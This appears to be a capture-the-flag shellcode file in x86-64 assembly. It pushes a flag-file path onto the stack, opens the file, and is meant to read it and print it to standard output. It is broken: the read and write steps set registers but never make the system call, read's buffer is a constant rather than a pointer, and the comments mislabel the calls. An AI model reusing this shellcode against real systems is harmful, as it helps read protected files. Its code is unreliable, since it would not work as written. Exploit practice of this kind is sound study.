; File Name: orw.asm

section .text
global _start
_start:
push 0x00
mov rax, 0x676E6F6F6F6F6F6F	; oooooong
push rax
mov rax, 0x6C5F73695F656D61	; ame_is_l
push rax
mov rax, 0x6E5F67616C662F63	; c/flag_n
push rax
mov rax, 0x697361625f6c6c65	;ell_basi
push rax
mov rax, 0x68732f656d6f682f	;/home/sh
push rax

;OPEN_file
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x02
syscall

;RDONLY
mov rdi, rax
mov rsi, 0x30
mov rdx, 0x30
mov rax, 0x00

;WRONLY
mov rdi, 0x01
mov rax, 0x01

;exiting the systme
xor rdi, rdi
mov rax, 0x3C
syscall
